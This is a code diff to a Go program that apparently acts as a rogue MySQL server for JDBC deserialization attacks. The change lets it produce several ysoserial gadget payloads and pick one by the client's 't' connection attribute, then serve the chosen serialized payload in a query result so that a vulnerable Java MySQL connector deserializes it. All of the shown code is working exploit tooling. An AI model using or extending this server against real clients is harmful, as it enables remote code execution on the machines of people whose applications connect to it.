@@ -25,7 +25,7 @@ type DB struct {
     fileIndex map[uint32]int
     config    Config
 
-    YsoserialOutput []byte
+    YsoserialOutput map[string][]byte
 }
 
 type Config struct {
@@ -38,7 +38,7 @@ type Config struct {
     AlwaysRead       bool                `yaml:"always_read"`
     VersionString    string              `yaml:"version_string"`
     JdbcExploit      bool                `yaml:"jdbc_exploit"`
-    YsoserialCommand []string            `yaml:"ysoserial_command"`
+    YsoserialCommand map[string][]string `yaml:"ysoserial_command"`
     AlwaysExploit    bool                `yaml:"always_exploit"`
 }
 
@@ -103,9 +103,12 @@ func main() {
     db.fileIndex = make(map[uint32]int)
     db.Handler = db
     db.config = config
+    db.YsoserialOutput = map[string][]byte{}
 
     if config.JdbcExploit {
-        db.YsoserialOutput = CmdExec(config.YsoserialCommand)
+            for index, command := range config.YsoserialCommand {
+                db.YsoserialOutput[index] = CmdExec(command)
+            }
     }
 
     var authServer mysql.AuthServer
@@ -195,7 +198,17 @@ func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Resu
                 {Name: "Variable_name", Type: sqltypes.Blob, Nullable: false},
                 {Name: "Value", Type: sqltypes.Blob, Nullable: false},
             })}
-            r.Rows = append(r.Rows, mysql.RowToSQL(mysql.SQLRow{[]byte{}, db.YsoserialOutput}))
+
+            t := c.ConnAttrs["t"]
+            if len(db.YsoserialOutput[t]) == 0 {
+                for tmp, _ := range db.YsoserialOutput {
+                    t = tmp
+                    break
+                }
+            }
+
+            log.Infof("Sending [%v] payload to mysql client", t)
+            r.Rows = append(r.Rows, mysql.RowToSQL(mysql.SQLRow{[]byte{}, db.YsoserialOutput[t]}))
 
             _ = callback(r)
         } else if strings.HasPrefix(query, "/* mysql-connector-java-8") {
